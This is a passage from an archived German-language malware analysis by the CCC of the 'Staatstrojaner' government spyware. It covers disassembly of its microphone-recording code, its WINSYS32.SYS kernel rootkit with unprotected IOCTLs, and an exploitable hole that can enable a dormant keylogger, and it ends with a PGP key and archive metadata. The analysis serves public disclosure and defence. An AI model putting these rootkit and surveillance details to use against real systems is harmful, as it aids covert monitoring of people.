ICHNUNG\n\n**Bedingt durch die Hürden des C++-lastigen Codes konnten wir bislang keinen**\n**Call-Path finden, über den die akustische Raumüberwachung ohne Nachladen**\n**eines entsprechenden Programms über die oben beschriebene Funktion gestar-**\n**tet werden kann. Der notwendige Code steht jedoch ziemlich vollständig in der**\n**DLL bereit und eignet sich, um das Mikrophon eines Computers anzuschalten**\n**und Audiodaten weiterzuverarbeiten.**\n\n.text:10008EC3 024    mov   ecx, offset mm_function_table ; call\n.text:10008EC8 024    call  _0zapf_mm_waveInOpen\n.text:10008EC8\n.text:10008ECD 00C    mov   eax, [edi]\n.text:10008ECF 00C    push  20h            ; cbwh\n.text:10008ED1 010    push  ebx            ; pwh - - WAVE Header /\nBuffer\n.text:10008ED2 014    push  eax            ; hwi - - WAVE Handle\n.text:10008ED3 018    mov   ecx, offset mm_function_table ; call\n.text:10008ED8 018    call  _0zapf_mm_waveInPrepareHeader ; vermutlich platz\nfuer eine sekunde audio bei 23040 samples/sec\n.text:10008ED8\n.text:10008EDD 00C    mov   ecx, [edi]\n.text:10008EDF 00C    add   esi, 58h\n.text:10008EE2 00C    push  20h            ; cbwh\n.text:10008EE4 010    push  esi            ; pwh\n.text:10008EE5 014    push  ecx            ; hwi\n.text:10008EE6 018    mov   ecx, offset mm_function_table ; call\n.text:10008EEB 018    call  _0zapf_mm_waveInPrepareHeader\n.text:10008EEB\n.text:10008EF0 00C    mov   edx, [edi]\n.text:10008EF2 00C    push  20h            ; cbwh\n.text:10008EF4 010    push  ebx            ; pwh\n.text:10008EF5 014    push  edx            ; hwi\n.text:10008EF6 018    mov   ecx, offset mm_function_table ; call\n.text:10008EFB 018    call  _0zapf_mm_waveInAddBuffer\n...\n\n**Da ebenso noch Code des für Sprachkompression gebauten Codecs „SPEEX“ im**\n**Trojaner gefunden wurde, nehmen wir an, daß die Sprachdaten z. B. auch aus**\n**der von uns nicht näher analyiserten Skype-Überwachung damit für eine Über-**\n**tragung vorbereitet werden sollen.**\n\n**Pikantes Detail an dieser Stelle: Die Hersteller des Trojaners kommen der ex-**\n**pliziten Forderung aus den Lizenzbedingungen von Speex nicht nach, den Be-**\n**nutzer auf geeignete Art und Weise über der Verwendung des Codes hinzuwei-**\n**sen. Dies geschieht üblicherweise in einem eigenen**\n**„About“- oder „License“-Fenster.**\n\n\n-----\n\nSEI TE 17\n\n## WI N D O WS- K E RNE L- T RE IB E R\n\n**Teil des Trojaners ist eine Art Rootkit in Form eines Kernel-Moduls namens**\nWINSYS32.SYS. Dieses Kernel-Modul dient dem Zweck, dem Rest des Trojaners\n**Zugriff auf einige Systemfunktionen zu ermöglichen, für die er sonst nicht die**\n**nötigen Zugriffsrechte hätte.**\n\n## FUN K T I O N E N DE S K E RNE L -MO DUL S\n\n**Das Kernel-Modul erlaubt nach der Installation beliebigen Prozessen, Dateien**\n**an beliebiger Stelle im Dateisystem anzulegen, umzubenennen oder zu löschen**\n**und Daten in die Registry zu schreiben.**\n\n**Außerdem beinhaltet das Kernel-Modul größere Teile einer nicht verwendeten**\n**Tastatur-Logging-Funktionalität. Der Code zum Aktivieren dieser Funktion fehlt**\n**zwar, aber unter Ausnutzung eines Sicherheitslochs in dem Kernel-Modul kann**\n**man den Keylogging-Code trotzdem anschalten und nutzen.**\n\n**Des weiteren fanden wir in dem Kernel-Modul auch ungenutzte Codefragmente**\n**für Usermode-Shellcode-Injection und für IRP-Umlenkung (könnte im Kontext**\n**des Keylogging Anwendung gefunden haben).**\n\n## N A M E N U ND PFADE\n\n**Das Kernel-Modul trägt in allen von uns untersuchten Versionen des Trojaners**\n**den Namen WINSYS32.SYS und meldet im System ein Gerät unter den Pfaden**\n\\Device\\KeyboardClassC und \\DosDevices\\KeyboardClassC an.\n**Der Zugriff auf dieses Gerät ist nicht beschränkt, es wird nicht einmal das**\nFILE_DEVICE_SECURE_OPEN-Flag gesetzt.\n\n\n-----\n\nSEI TE 18\n\n**Auf Handles zu diesem Gerät akzeptiert das Kernel-Modul IOCTLs mit folgen-**\n**der Funktionalität:**\n\n**• Keylogger-Puffer auslesen,**\n\n**• schreibe Puffer in Datei, nimmt den Dateinamen, kein Handle,**\n\n**• erstelle Datei, nimmt den Dateinamen,**\n\n**• Datei umbenennen, nimmt Quell- und Zieldateinamen,**\n\n**• Datei nach Neustart löschen, trägt einen Dateinamen in die Registry ein, da-**\n**mit er nach dem nächsten Neustart gelöscht wird,**\n\n**• Key/Value-Paar in die Registry schreiben,**\n\n**• Version des Kernel-Moduls in Buffer schreiben,**\n\n**• Blue Screen auslösen, diese Funktion ist redundant, da mangels ordentlicher**\n**Eingabevalidierung auch die anderen Funktionen zum Auslösen eines Blue-**\n**Screens verwendet werden können.**\n\n**In dem ungenutzten Userspace-Shellcode-Codepfad findet sich hartkodiert der**\n**Name der Trojaner-DLL: MFC42UL.DLL**\n\n## SK Y PE - I N TE RFACE\n\n**Da das Anzapfen von Skype und anderen verschlüsselten Kommunikationspro-**\n**tokollen letztlich der Grund und die Legitimation einer „Quellen-TKÜ“ sind, ha-**\n**ben wir die entsprechenden Teile im Trojaner noch nicht näher untersucht. Die**\n**Anwesenheit der entsprechenden Komponenten im Code ist jedoch offensicht-**\n**lich. Wir sind natürlich dankbar über jeden, der sich der Skype-Thematik in der**\n**vorliegenden Schadsoftware annimmt und uns die Dokumentation sendet, da-**\n**mit wir dieses für die Nachwelt sammeln und veröffentlichen können.**\n\n\n-----\n\nSEI TE 19\n\n## E I N S EN D U NG WE ITE RE R A NAL YSE-ER G EBNISSE\n\n**Wir sind für weitere Hinweise auf gefundene Funktionen, Parameter und Fehler**\n**sehr dankbar und werden diese gern in zukünftige Versionen dieses Berichts**\n**integrieren. Bitte vermerkt bei der Einsendung, ob und wenn ja mit welchem**\n**Namen ihr dafür erwähnt werden möchtet. Der PGP-Key für die Einsende-Mail-**\n**adresse 0zapftis@ccc.de findet sich untenstehend.**\n\n**PGP-Key für 0zapftis@ccc.de**\n\n**Fingerprint: 62D7 AAB0 7A2F 2ABD 2899 91E3 F06D 0BAB 93C1 30A0**\n\n-----BEGIN PGP PUBLIC KEY BLOCK----\nComment: GPGTools - http://gpgtools.org\n\nmQINBE6OIJYBEADA8V/CA60MHsizwIEk46q3Tw2/DceWdN5jpqr8xD00vhjLMjBx\n\nkFgbZdou6yrYnZbrTC72dQbqj/e0KJaj5gmDjzEb29GKxFRbZkhjMSxYPBb4rawJ\n\nMRQdv/o/Olsf7ucLCEMRjuNxxczpo5dayDZC1yT4P/PcERscOM1RIOkM+Iaqde4v\n\nApEZavNMrXBlV/s/cQ6gMnzqyzv9dNRaUN8BbNWufWmvue22DUR2kUpsEWYfXBe6\n\no70k8nxe91uHBDnfjL12n2E7kI79+umniOdXYPQgfzBLTnAgCjHjt+Xy75LOiYXt\n\nea7KPaGZoe9RuV+gAcK0G+NElDF7PjeuHbsV3YLXuQ7wjmbsn6qjpxl2E6C+vY30\n\n29+4Si7FgwKLlJ/NVrAg90OGEQ13BvPGFUq5rES/ILs31fa7jcIXKaF+ADcMs9o3\n\nymXQF/wU1ENyUMtLsEz9DZ8yKgLVmLlieVmaiMPaJXSFYyHTccJoJ48QfYQARuMa\n\nOR+bMhW/wWoubIKgj1tL35GF9fJ0hYpwtMG+Xfyi/JG8fJHV8J01sKG5w/UaBAY1\n\nT4quFIHcdMjoRXwtExCsDjyqHRJAakL4WZEjulb3ReGVfuk+pVXTG4Hsp3E8oVKT\n\nv62ahMg7X5ugek232DwUTzfU77sNkcTiuXokPMswbEIfp5zmm9pUhalcnQARAQAB\n\ntDcwIFphcGZ0IElzISBSZXZlcnNlIEVuZ2luZWVyaW5nIElucHV0IDwwemFwZnRp\n\nc0BjY2MuZGU+iQI+BBMBAgAoBQJOjiCWAhsvBQkHhh+ABgsJCAcDAgYVCAIJCgsE\n\nFgIDAQIeAQIXgAAKCRDwbQurk8EwoEHBD/4vkbPzdBw9Ra7IBJCFe6aTUlw4qskU\n\nWM+2hyC06wOWgZM8KiGABFabInJ+2krc+humAuRJoZPySoHyOi/QY9ND033FgkhX\n\nVea9EJpZRm0tJmbFMlFLzwT9fZ5r7GL0xLrQKoMEK3vUd0b3xQBqeaFEpB+VfU8Q\n\nvKmgTG4dO8pYKVe3/MnjAkS6fUUFOsl9QvHCW8+u2Qn4fl7mUygBTLfK4y2KDruh\n\nrh3EjeSuSaMdkNlXLDyEI5Hxttn0fTDp8K2Sh15qaeR1uMrwtxPHZRuSUw7jZ7xH\n\n24eUjJ4ipnwLMqeTNiL5JBwzQIRp9pb1cjiNuhxUCT4tGBPTeHgPR2MeEbBfFuYJ\n\nJnSEEO8VRStZXWWAKHj1ku8+YQ90SmFloRAbjlrkZpJn+vrj66wyGyzVbe1bD3Gy\n\njokwVEhcierUaSpUq9ChBIB+vbMQZlchUfIGZPln/WOuwSgo2L6CNTfcA/6FvHYu\n\n+2Mg5VoeHOxQm28ZXjqCsODx3+j476S9VlHIDsBRmqPbOUoEzY2VIAyDzTlQE5Kn\n\nkBGp8FXk68QYVSS+ZI00cLtoDZlDD22scjn6qDk1y6oHuUnP9UoIF8t2kR1j9xG3\n\nFKrSNufwivgkZ3Fr2n+s9jYMom8YfZi15coNntyYSo7WQOgA29Ssfu8dfG56cdUc\n\nWPrcjLfEcjvPMrkCDQROjiCWARAA4dsiBRvVSRN0YFW8iYJNqH0jzu/CwbjsQAOt\n\nN6xM8OrjEsu3y82q0g/NryJJ4cVq3kl4r+WDoCwD2wR+oT4oMmg5jWtrs8lSikaG\n\n6Gl1W8e81zkyvDol8+BQLFEDxyyOZ313rQznP8RsBzk8u8x1YBPNyeHEJMF3dusm\n\n\n-----\n\nSEI TE 20\n\n\n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\n\nZQ==\n\n=jS/I\n\n-----END PGP PUBLIC KEY BLOCK----\n\n-----",
    "language": "DE",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "http://www.ccc.de/system/uploads/76/original/staatstrojaner-report23.pdf"
    ],
    "report_names": [
        "staatstrojaner-report23.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/3fb5bde6fcd475b6fc0a488bf6b0b413fc22810b.pdf",
        "text": "https://archive.orkl.eu/3fb5bde6fcd475b6fc0a488bf6b0b413fc22810b.txt",
        "img": "https://archive.orkl.eu/3fb5bde6fcd475b6fc0a488bf6b0b413fc22810b.jpg"
    }
}